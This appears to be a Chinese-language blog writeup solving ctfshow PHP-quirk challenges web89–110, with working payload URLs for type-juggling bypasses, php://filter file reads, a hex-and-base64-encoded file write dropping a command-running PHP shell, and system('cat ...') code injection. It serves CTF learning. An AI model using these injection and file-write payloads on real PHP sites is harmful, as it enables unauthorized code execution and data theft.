---
title: "ctfshow Web入门[PHP特性] web89-110 Writeup"
date: 2022-08-10T18:39:05+08:00
draft: false
author: "X1r0z"

tags: ['ctf','php']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

PHP 的相关特性, 例如弱类型, 变量覆盖

<!--more-->

## web89

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101050983.png)

`http://44237afb-ae1e-47ea-8b59-d43af0ddf381.challenge.ctf.show/?num[]=a`

`preg_match()` 匹配数组时会返回 false

而 `intval()` 接受数组后仍返回 true

## web90

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101105810.png)

这里 `===` 不仅会判断内容是否相同, 而且还会判断类型是否相同

PHP 文档

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101106957.png)

当 base 为 0 时, 会检测 value 的格式来决定使用的进制

我们可以使用八进制或者十六进制绕过

或者使用 `1146.0` `1146aaa`, 因为 `intval()` 是一个**取整**函数, 非整数部分都会被截断, 包括字符串

payload

```
http://e1400b46-43c1-413e-a644-00d0f4fc4559.challenge.ctf.show/?num=0x117c
http://e1400b46-43c1-413e-a644-00d0f4fc4559.challenge.ctf.show/?num=1146.0
http://e1400b46-43c1-413e-a644-00d0f4fc4559.challenge.ctf.show/?num=1146aaa
```

## web91

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101113835.png)

`/i` 表示忽略大小写, `/m` 表示多行匹配, `^` 表示匹配开头, `$` 表示匹配结尾

即多行/单行匹配以 `php` 为开头和结尾的字符串

多行匹配 (不匹配换行符)

````re
^xxx$
^yyy$
^zzz$
````

单行匹配 (匹配换行符, 相当于一行)

```re
^xxx
yyy
zzz$
```

这里我们用换行符通过第一个 if, 绕过第二个 if, 得到 flag

```
http://10c6de4e-34f6-40db-aea3-0be726db896f.challenge.ctf.show/?cmd=%0aphp
http://10c6de4e-34f6-40db-aea3-0be726db896f.challenge.ctf.show/?cmd=abc%0aphp
```

看了 hint 才知道这原来是一个解析漏洞...

[https://blog.csdn.net/qq_46091464/article/details/108278486](https://blog.csdn.net/qq_46091464/article/details/108278486)

[https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html](https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html)

## web92

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101138737.png)

相比于之前那题把 `===` 改成了 `==`

这时候用 `==` 比较的时候会进行弱类型转换, `4476.0` 不能用了, 但 `4476.1` 可以用

另外还能用科学计数法, `123e456` 就是 `123x10^456`, 这里因为传参是当字符串处理的, 传递 `4476e123` 在类型转换后会被当作科学计数法, 而在 `intval()` 中则是取整, 遇到字母 `e` 后被截断

```
http://0c177459-605c-4c7b-aadf-072390d97a5c.challenge.ctf.show/?num=0x117c
http://0c177459-605c-4c7b-aadf-072390d97a5c.challenge.ctf.show/?num=4476.1
http://0c177459-605c-4c7b-aadf-072390d97a5c.challenge.ctf.show/?num=4476e123
```

## web93

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101156543.png)

十六进制和科学计数法不能用了, 但八进制和小数点还能用

```
http://637429f9-17ba-4740-8ce0-d6d0a4d30560.challenge.ctf.show/?num=4476.1
http://637429f9-17ba-4740-8ce0-d6d0a4d30560.challenge.ctf.show/?num=010574
```

## web94

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101200379.png)

注意这里的 `!strpos()`, `strops()` 返回对应字符第一次出现的位置

如果我们使用八进制 `010574`, `strpos("010574", "0")` 返回0, 也就是 false, 加了 `!` 后反而变成 true

所以字符串中必须有0, 但0不能在首位 (过滤了八进制), 可以用小数点绕过

```
http://7032c441-7ef1-4baa-bfb3-212c1d5cdb9d.challenge.ctf.show/?num=4476.0123
```

网上 wp 中有一个加空格的方法, 可以绕过八进制的过滤

```
http://7032c441-7ef1-4baa-bfb3-212c1d5cdb9d.challenge.ctf.show/?num=%20010574
```

## web95

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101207608.png)

小数点过滤了, 可以用空格+八进制, 空格在转换时会被自动去除

测试的时候发现前面加上其它东西也能通过

```
http://b4c7751b-3de6-4337-9952-205d726abbcc.challenge.ctf.show/?num=%20010574
http://b4c7751b-3de6-4337-9952-205d726abbcc.challenge.ctf.show/?num=%0a010574
http://b4c7751b-3de6-4337-9952-205d726abbcc.challenge.ctf.show/?num=%09010574
http://b4c7751b-3de6-4337-9952-205d726abbcc.challenge.ctf.show/?num=+010574
```

## web96

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101213482.png)

类似文件包含

```
http://ae720f5a-c4fd-4b54-9e74-8e27500c3eb7.challenge.ctf.show/?u=php://filter/convert.base64-encode/resource=flag.php
```

或者用绝对路径和相对路径

```
http://ae720f5a-c4fd-4b54-9e74-8e27500c3eb7.challenge.ctf.show/?u=/var/www/html/flag.php
http://ae720f5a-c4fd-4b54-9e74-8e27500c3eb7.challenge.ctf.show/?u=./flag.php
```

## web97

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101219528.png)

md5 0e 漏洞?

如果是 `==` 的话, 任意两个字符串加密后生成的 md5 为字符串类型, 进行比较的时候, 以 0e 开头的字符串例如 `0e123` 和 `0e456`, 会被类型转换为科学计数法, 即 `0==0`, 返回 true

但这里是 `===`, 两个字符串类型的 `0e123` 和 `0e456` 进行比较时, 不会进行类型转换, 只进行字符串内容的比较, 而这里很明显不相等, 返回 false

那要怎么绕过? 用数组

利用 md5 加密数组时, 会报错并返回 NULL

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101231423.png)

而无论是 `NULL == NULL` 还是 `NULL === NULL`, 都会返回 true, 所以就通过了这个 if 的判断

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101232515.png)

## web98

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101235205.png)

`&` 为 php 的引用

> 在PHP 中引用的意思是: **不同的名字访问同一个变量内容**.
> 与Ｃ语言中的指针是有差别的. Ｃ语言中的指针里面存储的是变量的内容, 在内存中存放的地址.

首先判断 GET 是否有参数, 有的话就把 `$_POST` 的引用给 `$_GET` (即下面的 `$_GET` 全部都当作 `$_POST`)

然后判断 `$_POST['flag']` 的内容是否为 `flag`, 是的话把 `$_COOKIE` 的引用给 `$_GET` (即下面的 `$_GET` 全部都当作 `$_COOKIE`)

然后判断 `$_COOKIE['flag']` 的内容是否为 `flag`, 是的话把 `$_SERVER` 的引用给 `$_GET` (即下面的 `$_GET` 全部都当作 `$_SERVER'`)

最后判断 `$_SERVER['HTTP_FLAG']` 的内容是否为 `flag`, 是的话输出 `$flag` 的内容

payload 如下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101248545.png)

hint 的方法如下, 省去了中间两步的判断, 没有那么绕了

```
GET 一个 ?HTTP_FLAG=flag 加 POST 一个 HTTP_FLAG=flag 
```

其实 GET 随便一个值都可以, 只要保证 POST 的内容是 `HTTP_FLAG=flag` 即可

## web99

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101436589.png)

本地测试了一下发现当 `n=123` 时概率最大, 可以通过 if

但是我们需要以 n 为文件名写文件, n 的值必须是字符串

这里考察的是 `in_array()` 的漏洞 (其实还是弱类型转换)

```php
var_dump(in_array('1abc', [1,2,3,4,5])); // true
var_dump(in_array('abc', [1,2,3,4,5])); // false
var_dump(in_array('abc', [0,1,2,3,4,5])); // true
```

`in_array()` 会将待搜索的值的类型自动转换为数组中的值的类型 (string to int)

所以我们构造 `n=123.php` 并不影响 `in_array()` 的查找

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101447820.png)

访问得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101447468.png)

该漏洞的修复方式如下

```php
in_array($_GET['n'], $allow, true);
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101450349.png)

## web100

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101451950.png)

不太懂, 搜了一下发现考察的是运算符的优先级

[https://www.php.net/manual/zh/language.operators.precedence.php](https://www.php.net/manual/zh/language.operators.precedence.php)

查阅文档可以知道 `=` 的优先级是比 `and` 要高的

也就是说 `$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);` 实际上是先执行了 `$v0=is_numeric($v1)`, 然后返回 true 或者 false, 之后执行 `true and is_numeric($v2) and is_numeric($v3);` 或者是 `false and is_numeric($v2) and is_numeric($v3);` (感觉没啥意义, 因为这个表达式的结果没有赋值)

使用 `var_dump()` 导出 ctfshow 这个类, 注意 v2 不能含有 `;`

```
http://cc9adbd1-0cdb-4ae4-bcac-80750548dc2c.challenge.ctf.show/?v1=123&v2=var_dump($ctfshow)/*&v3=*/;
```

不写注释也行, 报错之后依然输出了 flag 值

然后替换 `0x2d` 为 `-`

## web101

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101515863.png)

比上题增加了更多的过滤, 而且单引号和 `$` 都被过滤了

ctfshow 关键词只能以字符串的形式出现, 刚好最近在学 Java 的反射, 想着 php 会不会也有...

[https://www.php.net/manual/zh/class.reflectionclass.php](https://www.php.net/manual/zh/class.reflectionclass.php)

下划线过滤了, 不能用 `var_dump()` 之类的函数, 但是 ReflectionClass 存在 `__toString()` 的魔术方法, 可以尝试 echo 输出

```
http://38ac8284-df96-4128-b419-a89849950fa7.challenge.ctf.show/?v1=123&v2=echo new ReflectionClass&v3=;
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101525170.png)

hint 提示 flag 末尾少一位, 需要手工 `0-f` 都试一下

## web102

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101530607.png)

回调函数

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101532765.png)

这里的 `is_numeric()` 是识别科学计数法的, `0123e45678` 返回 true, 但只要包含了非 `e` 的其他字母则会返回 false

`$v2` 必须为数字, 第一时间就想到了 `hex2bin()`, 但是 `<` hex 的结果是 `0x3c`, 含有非 `e` 字母

然后又想到 php://filter, 写入的时候 base64 decode 一下或许可以?

但问题是 base64 的部分字符串 hex 之后存在非 `e` 字母, 例如

```
jklmoz 6a6b6c6d6f7a
JKLMOZ 4a4b4c4d4f5a
/ 2f
```

那么我们需要找到一个合适的 payload , 使它经过 base64 + hex 之后的字符串仅包含 `[0-9]` 和 `e`, 才能够绕过 `is_numeric()` 的检测

```php
<?php
echo bin2hex(str_replace('=', '', base64_encode($_GET[1])));
?>
```

测试出来这个

```
5044383959474e6864434171594473 // <?=`cat *`;
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101634569.png)

hex 码前面记得补两个0 (substr)

然后访问 a.php 得到 flag

## web103

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101639404.png)

加了句这个, payload 同上

## web104

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101642334.png)

sha1 0e 漏洞, 而且是 `==`

以下值在 sha1 加密后以 0e 开头

```
aaroZmOk
aaK1STfY
aaO8zKZF
aa3OFF9m
0e1290633704
10932435112
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101646079.png)

或者用数组绕过

然后回过头看发现好像不太对???

直接传 `v1=1` `v2=1` 也能得到 flag

## web105

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101648022.png)

很明显的变量覆盖

首先我们 GET 不能传 `error=xx`, POST 不能传 `xxx=flag`

因为这里的 `$_POST['flag']` 无法进行覆盖, 如果我们想要绕过 `if(!($_POST['flag']==$flag))`, 就必须要已知 flag 的值, 或者是将 `$flag` 设置为空, 然后 post 传递 `flag=`

只能是第二种办法, 但是这会清空原来 `$flag` 里面的内容, 于是我们需要找到一个可以输出的变量来存储原来 `$flag` 的值

这里我们用 `$suces` 来存储 flag

GET 传递 `?suces=flag&flag`=,  同时 POST `flag=`

注意这里 GET 的变量覆盖是按照参数传递时从左到右的顺序进行的, 所以清空 `$flag` 的操作一定在后面

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101718980.png)

当然 GET 不传 `flag=` 也行

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101716289.png)

hint 的另一种方式

```
GET: ?suces=flag POST: error=suces
```

## web106

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101721782.png)

这里还是 `==`, 数组绕过或者用 sha1 0e

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101723909.png)

## web107

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101735458.png)

还是变量覆盖

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101738859.png)

另一种方法, 数组

```
GET: ?v3[]= POST: v1=
```

## web108

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101740263.png)

0x36d 转换成十进制是 877

首先参数 c 必须要以字母为开头和结尾, 然后反转再取整的结果要等于 877

不过这里的 `ereg()` 存在截断漏洞, `%00` 后的字符串不解析

构造 `aa%00778` 来绕过 `ereg()` 的检测

```
http://be29cb33-099a-45a3-ab65-e1e1ea722922.challenge.ctf.show/?c=aa%00778
```

## web109

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101751120.png)

v1 v2 必须含有字母

想到了 `hex2bin` `base64_encode` 这些函数, 但是前面有一个 `new`

搜了一下发现一个 stdClass, 没有任何字段和方法

本地试了一下报错了, 发现需要 `__toString` 魔术方法才能正常 echo 不报错

于是想到了之前有一题里用到了 php 的反射类 ReflectionClass (暂时只知道这个...)

之后就是注意闭合括号, 注释掉 v2 后面的内容

```
http://a243c3c5-6214-47b5-a8d1-36644e087a29.challenge.ctf.show/?v1=ReflectionClass&v2='stdClass');system('cat fl36dg.txt');//
```

hint 的方法, 用的是 Exception 类

```
?v1=Exception&v2=system('cat fl36dg.txt')
?v1=Reflectionclass&v2=system('cat fl36dg.txt')
```

发现竟然不用闭合括号...

## web110

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208101805550.png)

过滤的挺多的...

hint 提示是 `FilesystemIterator` 类

利用 `FilesystemIteraor` 的构造方法列目录

[https://www.php.net/manual/zh/filesystemiterator.construct.php](https://www.php.net/manual/zh/filesystemiterator.construct.php)

`getcwd()` 返回当前工作目录, 即 /var/ww/html

类里面刚好有 `__toString` 可以 echo 输出

```
http://566fb044-3805-43c9-9359-d09e3c07ddde.challenge.ctf.show/?v1=FilesystemIterator&v2=getcwd
```

flag 在 txt 里面... (本来以为是要读 php 文件的)